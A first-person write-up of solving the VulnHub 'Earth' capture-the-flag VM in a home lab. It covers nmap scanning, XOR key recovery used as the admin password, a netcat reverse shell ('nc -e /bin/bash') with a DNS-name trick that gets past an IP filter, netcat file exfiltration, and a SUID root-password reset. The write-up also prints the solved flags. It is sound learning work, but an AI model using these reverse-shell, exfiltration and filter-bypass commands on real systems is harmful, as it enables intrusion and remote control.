2024-11-23 15:38

Status: 

Tags: [[vulnhub]] [[virtual machine]] [[Cyber Security]] 

# Earth
I felt like I haven't done a CTF in a while, and I have been wanting to do more Write-Ups even though I have a back log to create on the HuntressCTF event. So lets look for some flags, I'm new to this box, and have never tried it before, but lets see what I can figure out.

## Start-up
I started the VM, and can see it a boot prompt, this is is set up in my own virtual environment, I know that the IP address is 10.9.9.10.
In my Kali VM, I'm going to ping the device just to make sure I reach it and my firewall is set up correctly. 
## Nmap
Now that we know everything looks to be running and is functional, lets run a [[nmap]] scan against this machine, for that I'll be running 
```
nmap -A -sV 10.9.9.10
```

the -sV tells nmap to scan for ports and services potentially running on the box.
the -A tells nmap to enabled OS detection, version detection, script scanning and trace routes.

Nmap spits out the following output 

```
Host is up (3.3s latency).
Not shown: 917 filtered tcp ports (no-response), 80 filtered tcp ports (host-unreach)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.6 (protocol 2.0)
| ssh-hostkey: 
|   256 5b:2c:3f:dc:8b:76:e9:21:7b:d0:56:24:df:be:e9:a8 (ECDSA)
|_  256 b0:3c:72:3b:72:21:26:ce:3a:84:e8:41:ec:c8:f8:41 (ED25519)
80/tcp  open  http     Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
|_http-title: Bad Request (400)
|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
443/tcp open  ssl/http Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
| http-methods: 
|_  Potentially risky methods: TRACE
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-title: Test Page for the HTTP Server on Fedora
| ssl-cert: Subject: commonName=earth.local/stateOrProvinceName=Space
| Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local
| Not valid before: 2021-10-12T23:26:31
|_Not valid after:  2031-10-10T23:26:31
|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.11 seconds
```

So we can see that [[SSH]] is open and the hostkey's we see that port 80 is open so there does appear to be a [[HTTP]] server, along with [[HTTPs]] 

Since we see these things I think the next step will be to look at the web page. 

## Web page
![Earth_VM WebServer Test Page](https://github.com/user-attachments/assets/1460d8f6-d710-4a35-94d2-63594e43975d)
So this is what we see when going to the web page. Well at least the nmap scan was able to provide us that this is an Apache 2.4.51 installation, so we are going to research that version of Apache and see if there are any known vulnerabilities which can be found at [[Apache 2.4 Vulnerabilities]]

Here is the same web page but browsing to the HTTP version instead of HTTPS
![Earth_VM http web page](https://github.com/user-attachments/assets/0a46ab29-d786-4676-834b-40e1eea033fe) 

## HTTP Methods
Another interesting thing in the nmap scan was the potentially risky http methods, I am not much of a penetration tester, and I am still working on learning it here, so I'm going to do some research on the HTTP methods, which has lead me to this page at [[HTTP Method Exploitation]]. Typically the only HTTP methods that should be exposed are HEAD, GET, POST, CONNECT.
PUT and DELETE these should be a little self explanatory and should probably be turned off
OPTIONS provides debugging information. Ideally would be disabled, because it just gives information on the server, which would be beneficial to the attacker.
TRACE the article describes it as surprising, but definitely a must to turn off. There is a link to a [[Project Code Review Guide - OWASP]] article [[Cross Site Tracing - OWASP]] Trace is also a debugging tool, but it provides information about the cookies, authorization headers and more.

After reading through the [[HTTP Method Exploitation]] on the Security Stack Exchange, this looks like it may be useful. I'll start reading about Cross Site Tracing and see what we can learn about this, and how we can abuse that. 
I am curious if it relates to the 400 BAD REQUEST we got when browsing to the HTTP version of the web page, or in the HTTP-TITLE that was provided by the nmap scan.

## TRACE HTTP Method
After reading the [[Cross Site Tracing - OWASP]] it looks like we can use curl to perform the TRACE on the web page, lets see what kind of information we can find out from this basic curl command.
```
curl -X TRACE 10.9.9.10
```
Which we get this as the response. 
```
TRACE / HTTP/1.1
Host: 10.9.9.10
User-Agent: curl/8.8.0
Accept: */*
```
It appears that the web server responded to our request. Since this is new to me, I am just following the examples in the Cross Site Tracing article. So we next use this command to see the response we received.
```
curl -X TRACE -H "Cookie: name=value" 10.9.9.10
```
and we got the response
```
TRACE / HTTP/1.1
Host: 10.9.9.10
User-Agent: curl/8.8.0
Accept: */*
Cookie: name=value
```
This looks good to me considering it basically follows the article, so this tells me there is something here that we can use to exploit this box. 

I read a lot on [[XSS]] and [[XST]], I am a little skeptical if I can use this method of getting into the VM, as we are provided just a blank Apache Web Server Test Page, so I'm not sure how TRACE would get me in. Which is leading me to see what the requests look like in [[Burp Suite]] I am also thinking about the TLS certificate that we noticed in the nmap scan. And since the HTTP request returns Bad Request 400.

## Burp Suite
Started the Burp Suite and went to my favorite section the proxy section, and I opened the browser and went to the web address for 10.9.9.10, after looking at the GET request we received in Burp, I adjusted the host field to earth.local and sent the request.
This immediately loaded us into the website.
![Earth_VM http web page loaded](https://github.com/user-attachments/assets/2c41b8f8-1495-45ab-88f9-5b99867bed70)
This is very interesting to me, so we can send a message, there's a message key and some previous messages. You may have noticed in the photo, but the web page is reloading, this is because my very next thought was to refresh the page, and see what the GET request looks like now! 
![Earth_VM Burp web page loaded request](https://github.com/user-attachments/assets/a2b7d956-1b48-4c7c-b937-5c8605bc5533)
We get a cookie with a csrftoken, surely that will be useful so I am going to paste that here.
```Cookie: csrftoken=dssBtXOheAqOCNlvquuRp6RglpISRzQxWEtjT7dXBSVPIWOO9bmNADZJrdCNeTY3```
So while I was at it, I decided I wanted to see what curl would provide. 
```curl -k -H "Host: earth.local" 10.9.9.10```
```
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Earth Secure Messaging</title>

<link rel="stylesheet" href="/static/styles.css">
</head>
<body>
<h1 class="aligncenter">Earth Secure Messaging Service</h1>
<div class="aligncenter">
<img src="/static/earth1.jpg" alt="Picture of Earth" width="400" height="400">
</div>
<form action="/" method="post">
    <label for="message">Send your message to Earth:</label>
    <input type="hidden" name="csrfmiddlewaretoken" value="YgXXNUuSElDUsVtin5g3GYuXl4xXemGZTrs7M8ClZ30t1RlF33WCNvVidnblxUVO">
    <p><label for="id_message">Message:</label> <textarea name="message" cols="40" rows="10" maxlength="500" required id="id_message">
</textarea></p>
<p><label for="id_message_key">Message key:</label> <input type="text" name="message_key" maxlength="50" required id="id_message_key"></p>
    <input type="submit" value="Send message">
</form>
Previous Messages:
<ul>

<li>37090b59030f11060b0a1b4e0000000000004312170a1b0b0e4107174f1a0b044e0a000202134e0a161d17040359061d43370f15030b10414e340e1c0a0f0b0b061d430e0059220f11124059261ae281ba124e14001c06411a110e00435542495f5e430a0715000306150b0b1c4e4b5242495f5e430c07150a1d4a410216010943e281b54e1c0101160606591b0143121a0b0a1a00094e1f1d010e412d180307050e1c17060f43150159210b144137161d054d41270d4f0710410010010b431507140a1d43001d5903010d064e18010a4307010c1d4e1708031c1c4e02124e1d0a0b13410f0a4f2b02131a11e281b61d43261c18010a43220f1716010d40</li>

<li>3714171e0b0a550a1859101d064b160a191a4b0908140d0e0d441c0d4b1611074318160814114b0a1d06170e1444010b0a0d441c104b150106104b1d011b100e59101d0205591314170e0b4a552a1f59071a16071d44130f041810550a05590555010a0d0c011609590d13430a171d170c0f0044160c1e150055011e100811430a59061417030d1117430910035506051611120b45</li>

<li>2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a</li>

</ul>
</body>
</html>
```
This next piece is really interesting to me. What if I refresh my page again and swap out the csrftokens in the cookie field. Let's try it!
```
<label for="message">Send your message to Earth:</label>
    <input type="hidden" name="csrfmiddlewaretoken" value="YgXXNUuSElDUsVtin5g3GYuXl4xXemGZTrs7M8ClZ30t1RlF33WCNvVidnblxUVO">
```
![Earth_VM swapped csrftoken](https://github.com/user-attachments/assets/cd7e8c11-ca74-44f3-99a8-017d5fd36bc3)
I got no change, I'm not really surprised, as I believe that middleware csrftoken is likely used when a message is sent, but I haven't tried that yet, so we'll be doing that next, it should be one of the basic first steps, but I like to gather as much information with one thing at a time. 
Okay instead of sending basic data, I am super curious, what if I use the middleware csrftoken as the message key and send out the first previous message. 
/* Note from Cory After proof reading: I now know what a csrftoken is haha. Web Apps are not a strong point. I'd love to know if there was an attack vector with the csrftokens though. I kinda feel like there is a way to use it, but I just don't know enough. */
I suppose I don't need to share burp images, here's the post request that was sent.
```
POST / HTTP/1.1
Host: 10.9.9.10
Content-Length: 656
Cache-Control: max-age=0
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
Origin: http://10.9.9.10
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.9.9.10/
Accept-Encoding: gzip, deflate, br
Cookie: csrftoken=YgXXNUuSElDUsVtin5g3GYuXl4xXemGZTrs7M8ClZ30t1RlF33WCNvVidnblxUVO
Connection: keep-alive

csrfmiddlewaretoken=fPQ00crRX5rK284n8vLWADUFi9TVZXXEa0laZqzkiNOjB4WKOtrvHal0asxjivct&message=37090b59030f11060b0a1b4e0000000000004312170a1b0b0e4107174f1a0b044e0a000202134e0a161d17040359061d43370f15030b10414e340e1c0a0f0b0b061d430e0059220f11124059261ae281ba124e14001c06411a110e00435542495f5e430a0715000306150b0b1c4e4b5242495f5e430c07150a1d4a410216010943e281b54e1c0101160606591b0143121a0b0a1a00094e1f1d010e412d180307050e1c17060f43150159210b144137161d054d41270d4f0710410010010b431507140a1d43001d5903010d064e18010a4307010c1d4e1708031c1c4e02124e1d0a0b13410f0a4f2b02131a11e281b61d43261c18010a43220f17&message_key=YgXXNUuSElDUsVtin5g3GYuXl4xXemGZTrs7M8ClZ30t1RlF33
```

The csrfmiddlewaretoken is different again, but we can see the message and message key sent as well. 

So I accidentally sent that post request twice, and then I sent another with the words "Hello" as the Message and "something" as the message key
![Earth_VM hello something message](https://github.com/user-attachments/assets/0536bafc-0c1c-44c5-ad78-d70d1d8ccd8e)
So my next though it's definitely running some code to encrypt the messages here. I wonder what type of encryption, that also means to me we might want to try and decrypt the other messages, I'm going to send another request, and the message and message key will both be "a" which gave us a previous message of "00"
So I sent another request with the key being "b" and the message "a" which gives us "03"
I now swapped it so the message is "b" and key is "a" this also gave us "03"
Interestingly enough if I enter the words "hello" for both fields, the previous message is 10 "0" which I feel like tells me quite a bit about how the message and key interact with each other.

## Hosts File
So to take another step away because I am feeling a little lost, I didn't do this earlier because I was playing with Burp, and just hand approving all my requests to the page, so lets run 
```
echo "10.9.9.10 earth.local >> /etc/hosts"
echo "10.9.9.10 terratest.earth.local >> /etc/hosts"
```
To add the server names to the host files, so we can browse to the host name instead of IP address and not have to approve our requests manually anymore, I also want to check out the terratest.earth.local, because it's interesting that there's a DNS name for both. 
![Earth_VM terratest earth local-robots txt](https://github.com/user-attachments/assets/6e05d21a-6f3f-4655-bf73-a78820b7b169)
Well robots are disallowed, but I surely am not a robot, so let's take a look what is in that directory. 
![Earth_VM terratest earth local-testingnotes txt](https://github.com/user-attachments/assets/1cfea973-3fc8-4f84-97b9-0e4f52112f84)
Alright, so I was already assuming that we were looking at [[XOR encryption]] for those messages, specifically because of how the interaction was between the same character letters. 
We are going to go look at testdata.txt next but we got an admin username which is also pretty cool. The earth.local host has an admin page, that we can see now that we have our host file set up.
![Earth_VM terratest earth local-testdata txt](https://github.com/user-attachments/assets/9af06b79-764a-4b95-b092-d0eb81d3e661)
Interesting, that's something I did not know, what I do know is that phrase was used to test encryption. That is likely the very first message sent on the page, so that gives us some more information.
The Todo section of the testingnotes.txt file tells us a couple more things, specifically the messaging and admin interface are basic, they probably are susceptible to some attacks I'm not yet familiar with, but FIRST we have the Plain Text and Cipher Text of the messages, so lets see if we can get the Key, I used [[CyberChef]] for this.
![Earth_VM XOR decoded ciphertext with plaintext](https://github.com/user-attachments/assets/2bf57d1d-17d8-401a-b060-6ed19dda5e5d)
So this gives us the output key of  
```
earthclimatechangebad4humans
```
We are going to try this key with the other two messages to see if we can decode those.

Out of absolute curiosity let's see if this is the password to the login page, with the username we had found earlier.
That is entirely what it was. 
![Earth_VM logged_in](https://github.com/user-attachments/assets/d4b37255-bb00-4e3d-81cf-0f1595ed8b08)
We are given a [[CLI]] which is interesting, so lets enumerate a little, we can see we are the apache user, I wonder if we could get root from this little CLI prompt. 

So after some browsing I was able to find the flag located in /var/earth_web/user_flag.txt
This is the first of 2 flags we are looking for on this machine. The other I know we need root access for.
![Earth_VM user_flag txt](https://github.com/user-attachments/assets/08588288-0deb-479b-aafe-67c7111fc8a1)

So let's try to connect to this system in a better way, because this CLI is hard to use and read haha. 
To do that lets go to our Kali VM and run 
```
nc -lvnp 4444
```

Then we can run in the CLI command
```
nc -e /bin/bash 10.0.0.2 4444
```
![Earth_VM nc fromCLI](https://github.com/user-attachments/assets/eb81634c-ad4c-4aa0-9741-549e24c1e655)
Huh remote connections are forbidden, I'm sure there is a way we can get around this, because the info in the testdata file stated that the messaging interfaces were pretty basic.
so lets modify our nc command
```
nc -e /bin/bash kali 4444
```
![Earth_VM ncConnected](https://github.com/user-attachments/assets/2c370469-b618-442c-9ce9-ffee6840057c)
To my surprise it connected, in my lab setup, my [[PFSense]] firewall is setup with the DNS name for kali. I imagine the web page is designed to throw an error when it encounters an IP address, you could probably obfuscate the CLI command to get it to run as well, but replacing the IP with a [[DNS]] name is really easy.
From here we can do some enumeration much easier than in the web interface.
```
find / -perm -u=s -type f 2>/dev/null
```
This command will search the entire root directory, for permission files with the set uid bit, this bit allows a file to execute with the permissions of it's owner rather than the user who runs it. the passwd command could be an example of this.
The type is looking for files rather than folders. and the 2>/dev/null gets rid of any errors. so it doesn't print to the screen. Here is what we receive from running that.
![Earth_VM findcommandran](https://github.com/user-attachments/assets/c10472b9-ba3d-4196-a409-42b024123b30)
What looks really interesting here is the reset_root file. Running that file it states 
```
reset_root
CHECKING IF RESET TRIGGERS PRESENT...
RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.
```
I wonder what the reset triggers are. Lets see if we can get that file downloaded to our kali vm.
In a new Terminal Tab we will run. 
```
nc -l -p 3333 > reset_root
```
And then in the tab connected to the server we will run.

```
nc -w 3 kali 3333 < /usr/bin/reset_root
```
This should send the file to our Kali VM where we can view the contents of it.
From there we are going to run ltrace on the file.
![Earth_VM ltrace](https://github.com/user-attachments/assets/ff4206c4-d721-4445-9950-1ba0676c1e79)
So it looks like the program checks to see if those files exist before executing. So we are going to create each of those files.
```
touch /dev/shm/kHgTFI5G
touch /dev/shm/Zw7bV9U5
touch /tmp/kcM0Wewe
```

Now let's run the program and see what happens. 
```
reset_root
CHECKING IF RESET TRIGGERS PRESENT...
RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth
```

Well we reset the root password, makes me wonder if ssh works now.
SSH did not work weirdly enough.
I had a really basic terminal after the nc connection, so I ran 
```
script /dev/null
```
Which did work in giving us a pseudo session, where we can run
```
su root
Password: Earth
```
And this gets us a root terminal we can run whoami to verify.
From here we have complete admin access to the VM. so lets run
```
ls /root
```
And we see the root_flag.txt file so lets cat that out, and that gives us our final flag for this VM.
![Earth_VM rootflagFound](https://github.com/user-attachments/assets/cfd6763b-d5e3-408b-b801-0e7a039d6dfa)

## Flags
user_flag_3353b67d6437f07ba7d34afd7d2fc27d
root_flag_b0da9554d29db2117b02aa8b66ec492e

## Thoughts
This was a pretty easy VM, I went down a couple of rabbit holes that didn't work for me, and I think in total I spent maybe 4-5 hours on this, I'll get faster as I get used to searching around, I suppose my research time really did cut into the total time I spent on this. 
It was less of a web challenge than I hoped, and more of a Linux system challenge with some web elements.
I can imagine someone with more experience could solve this VM in a matter of minutes. One day I'll get there.
# Resources
[[Apache 2.4 Vulnerabilities]] - https://httpd.apache.org/security/vulnerabilities_24.html
[[HTTP Method Exploitation]] - https://security.stackexchange.com/questions/21413/how-to-exploit-http-methods
[[Cross Site Tracing - OWASP]] - https://owasp.org/www-community/attacks/Cross_Site_Tracing
[[Cross Site Scripting - XSS - OWASP]] - https://owasp.org/www-community/attacks/xss/ and https://owasp.org/www-community/Types_of_Cross-Site_Scripting
[[Cross Site Scripting Prevention Cheat Sheet - OWASP]] - https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html 
[[DOM Based XSS Prevention Cheat Sheet - OWASP]] - https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html /* I did not read this one, just included it as I am Blue Team guy, so I want to know how to prevent some of this stuff. :) */
